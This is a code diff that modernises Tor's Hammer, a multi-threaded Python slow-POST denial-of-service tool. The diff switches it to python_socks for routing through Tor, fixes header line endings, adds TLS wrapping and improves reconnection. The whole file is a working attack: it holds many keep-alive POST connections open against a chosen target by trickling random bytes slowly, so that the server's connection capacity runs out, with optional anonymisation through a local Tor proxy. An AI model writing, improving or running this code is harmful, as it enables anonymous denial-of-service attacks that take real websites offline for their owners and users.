@@ -1,18 +1,13 @@
 #!/usr/bin/env python3
 
-# this assumes you have the socks.py (http://phiral.net/socks.py) in the
-# same directory and that you have tor running locally
-# on port 9150. run with 128 to 256 threads to be effective.
-# kills apache 1.X with ~128, apache 2.X / IIS with ~256
-# not effective on nginx
-
 import time
 import sys
 import random
 import getopt
-import socks
 import string
+import socket
 import ssl
+from python_socks.sync import Proxy
 
 from urllib.parse import urlparse
 from threading import Thread
@@ -21,6 +16,7 @@ stop_now = False
 live_connections = 0
 json_prefix = '{"a":"'
 json_postfix = '"}'
+connect_timeout=10
 
 def get_useragent_list():
 	with open('user-agents.txt') as f:
@@ -34,7 +30,7 @@ class HttpPostThread(Thread):
         self.thread_id = thread_id
         self.tor = tor
         self.content_type = content_type
-        self.transport = None
+        self.socket = None
         self.running = True
         url = urlparse(target)
         self.host = url.hostname
@@ -43,15 +39,26 @@ class HttpPostThread(Thread):
         self._init_socket()
 
     def _init_socket(self):
-        self.socket = socks.socksocket()
+        if not self.tor:
+            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.socket.settimeout(connect_timeout)
+
+    def _connect(self):
+        self._log(f'Connecting to {self.host}:{self.port}...')
         if self.tor:
-            self.socket.set_proxy(socks.SOCKS5, '127.0.0.1', 9150)
+            proxy = Proxy.from_url('socks5://127.0.0.1:9150')
+            self.socket = proxy.connect(
+                dest_host=self.host,
+                dest_port=self.port,
+                timeout=connect_timeout
+            )
+        else:
+            self.socket.connect((self.host, self.port))
+        if self.port == 443:
+            self.socket = ssl.create_default_context().wrap_socket(self.socket, server_hostname=self.host)
 
     def _log(self, msg):
         print(f'[{live_connections} live connections, thread #{self.thread_id}] {msg}')
-
-    def _format_error_message(self, err):
-        return err.msg if hasattr(err, 'msg') else f'{err.errno} {err.strerror}'
 
     def _send_http_post(self):
         dynamic_payload_length = random.randint(5000, 10000)
@@ -66,58 +73,56 @@ class HttpPostThread(Thread):
             'Connection: keep-alive',
             'Keep-Alive: timeout=900, max=1000',
         ]
-        headers = '\n'.join(headers_list)
-        self.transport.send(headers.encode())
-        self.transport.send(b'\n\n')
+        headers = '\r\n'.join(headers_list)
+        self.socket.sendall(headers.encode())
+        self.socket.sendall(b'\r\n\r\n')
         self._log(f'Sent headers:\n{headers}\n')
 
         if self.content_type == 'application/json':
             # self._log(f'Sending {json_prefix}')
-            self.transport.send(json_prefix.encode())
+            self.socket.sendall(json_prefix.encode())
         for i in range(0, dynamic_payload_length):
             if stop_now:
                 self.running = False
                 break
             p = random.choice(string.ascii_letters + string.digits)
             # self._log(f'Sending: {p} ({i + 1}/{dynamic_payload_length})')
-            self.transport.send(p.encode())
+            self.socket.sendall(p.encode())
             time.sleep(random.uniform(0.5, 8))
         if self.content_type == 'application/json':
             # self._log(f'Sending {json_postfix}')
-            self.transport.send(json_postfix.encode())
+            self.socket.sendall(json_postfix.encode())
 
-        chunk = self.transport.recv(4096)
-        self._log(f'Received:\n{chunk.decode()}')
-
-    def _connect(self):
-        self.socket.connect((self.host, self.port))
-        self.transport = self.socket if self.port != 443 else ssl.wrap_socket(self.socket)
+        if not stop_now:
+            chunk = self.socket.recv(4096)
+            self._log(f'Received:\n{chunk.decode()}')
 
     def run(self):
         global live_connections
         while self.running:
             while self.running:
                 try:
-                    self._log(f'Connecting to {self.host}:{self.port}...')
                     self._connect()
                     break
                 except Exception as e:
-                    self._log(f'Error connecting to {self.host}:{self.port}: {self._format_error_message(e)}')
-                    self._init_socket()
-                    time.sleep(0.5)
+                    self._log(f'Error connecting to {self.host}:{self.port}: {e}')
+                    if self.running:
+                        time.sleep(random.uniform(1, 5))
+                        self._init_socket()
 
             while self.running:
                 try:
                     live_connections += 1
                     self._send_http_post()
                 except Exception as e:
-                    self._log(f'Connection closed, error: {self._format_error_message(e)}. Restarting...')
-                    self.transport.close()
-                    self._init_socket()
-                    time.sleep(0.5)
+                    self._log(f'Connection closed, error: {e}')
                     break
                 finally:
                     live_connections -= 1
+                    self.socket.close()
+                    if self.running:
+                        time.sleep(random.uniform(1, 5))
+                        self._init_socket()
 
 def usage():
     print('./torshammer.py -t <target> [-r <threads> -T -h]')
@@ -126,7 +131,7 @@ def usage():
     print(' -r|--threads <Number of threads> Defaults to 256')
     print(' -T|--tor Enable anonymising through tor on 127.0.0.1:9150')
     print(' -h|--help Shows this help\n')
-    print('Eg. ./torshammer.py -t 192.168.1.100 -r 256\n')
+    print('Eg. ./torshammer.py -t http://192.168.1.100/path -r 256\n')
 
 def main(argv):
     try:
@@ -179,10 +184,4 @@ def main(argv):
                 t.running = False
 
 if __name__ == '__main__':
-    print('* Tor''s Hammer ')
-    print('* Slow POST DoS Testing Tool')
-    print('* entropy [at] phiral.net')
-    print('* Anon-ymized via Tor')
-    print('* We are Legion.')
-
     main(sys.argv[1:])
